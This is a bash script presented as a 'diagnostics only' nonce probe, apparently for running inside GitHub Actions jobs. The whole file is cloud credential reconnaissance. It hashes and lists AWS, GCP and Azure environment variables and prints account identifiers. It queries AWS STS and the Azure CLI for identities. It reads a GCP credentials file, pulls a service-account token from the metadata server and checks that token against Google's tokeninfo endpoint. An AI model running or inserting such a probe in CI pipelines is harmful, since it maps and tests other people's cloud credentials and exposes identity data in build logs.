#!/usr/bin/env bash
# c211-i122092 nonce probe - diagnostics only.
# Prints presence/len/sha256 of cloud env vars, AWS identity if available, GCP metadata identity if available.
# Never prints secret values (only sha256), never writes to any cloud, never starts any workload.
set -u
NONCE="c211-i122092-9f3a71c4"
tag() { echo "C211_I122092_$1 nonce=${NONCE} $2"; }
tag PROBE_START "probe_sha256=$(sha256sum "$0" 2>/dev/null | awk '{print $1}')"
tag RUN "run_id=${GITHUB_RUN_ID:-} run_attempt=${GITHUB_RUN_ATTEMPT:-} job=${GITHUB_JOB:-} workflow=${GITHUB_WORKFLOW:-} event=${GITHUB_EVENT_NAME:-} repository=${GITHUB_REPOSITORY:-} head_repo=${GITHUB_REPOSITORY_OWNER:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-} actor=${GITHUB_ACTOR:-} triggering_actor=${GITHUB_TRIGGERING_ACTOR:-}"
tag HOST "host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null) pwd=$(pwd)"
for pref in AWS_ GOOGLE_ GCP_ AZURE_ ARM_ CLOUDSDK_; do
  for v in $(env | sed -n "s/^\(${pref}[A-Za-z0-9_]*\)=.*/\1/p" | sort -u); do
    val="${!v}"
    [ -z "${val}" ] && continue
    h=$(printf '%s' "${val}" | sha256sum | awk '{print $1}')
    tag ENV "name=${v} len=${#val} sha256=${h}"
  done
done
# Non-secret identifying values (public identifiers only).
for v in AWS_ROLE_ARN AWS_REGION AWS_DEFAULT_REGION AWS_DOCKER_ARTIFACT_REPO GOOGLE_CLOUD_PROJECT GCLOUD_PROJECT CLOUDSDK_CORE_PROJECT CLOUDSDK_PROJECT GCP_PROJECT ARM_TENANT_ID ARM_CLIENT_ID ARM_SUBSCRIPTION_ID AZURE_TENANT_ID AZURE_CLIENT_ID AZURE_SUBSCRIPTION_ID; do
  val="${!v:-}"
  [ -z "${val}" ] && continue
  tag IDENT "name=${v} value=${val}"
done
# AWS identity if any credential material is present.
if [ -n "${AWS_ACCESS_KEY_ID:-}${AWS_WEB_IDENTITY_TOKEN_FILE:-}${AWS_ROLE_ARN:-}" ] && command -v aws >/dev/null 2>&1; then
  ident=$(aws sts get-caller-identity --output json 2>&1 | tr -d '\n' | head -c 1500)
  tag AWS_IDENTITY "${ident}"
elif [ -n "${AWS_ACCESS_KEY_ID:-}${AWS_WEB_IDENTITY_TOKEN_FILE:-}${AWS_ROLE_ARN:-}" ]; then
  tag AWS_IDENTITY "aws_cli_absent"
fi
# GCP credentials file metadata (no private key).
if [ -n "${GOOGLE_GHA_CREDS_PATH:-}" ] && [ -f "${GOOGLE_GHA_CREDS_PATH}" ]; then
  py=$(python3 - "${GOOGLE_GHA_CREDS_PATH}" <<'PYX'
import json,sys
try:
    d=json.load(open(sys.argv[1]))
    print("type=%s client_email=%s project_id=%s token_uri=%s" % (d.get("type"), d.get("client_email"), d.get("project_id"), d.get("token_uri")))
except Exception as e:
    print("creds_parse_error=%s" % type(e).__name__)
PYX
)
  tag GCP_CREDS_FILE "len=$(wc -c < "${GOOGLE_GHA_CREDS_PATH}") sha256=$(sha256sum "${GOOGLE_GHA_CREDS_PATH}" | awk '{print $1}') ${py}"
fi
# GCP metadata-server identity if running on GCP.
md=$(curl -s -m 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null)
if [ -n "${md}" ]; then
  at=$(printf '%s' "${md}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
  if [ -n "${at}" ]; then
    tag GCP_METADATA_TOKEN "len=${#at} sha256=$(printf '%s' "${at}" | sha256sum | awk '{print $1}')"
    ti=$(curl -s -m 5 "https://oauth2.googleapis.com/tokeninfo?access_token=${at}" 2>/dev/null | tr -d '\n' | head -c 1200)
    tag GCP_TOKENINFO "${ti}"
  else
    tag GCP_METADATA_TOKEN "present_but_no_access_token len=$(printf '%s' "${md}" | wc -c)"
  fi
else
  tag GCP_METADATA_TOKEN "absent"
fi
# Azure CLI identity if present.
if command -v az >/dev/null 2>&1 && { [ -n "${AZURE_CLIENT_ID:-}${ARM_CLIENT_ID:-}" ] || [ -n "${AZURE_CONFIG_DIR:-}" ]; }; then
  tag AZURE_IDENTITY "$(az account show --output json 2>&1 | tr -d '\n' | head -c 1200)"
fi
tag PROBE_END "done"
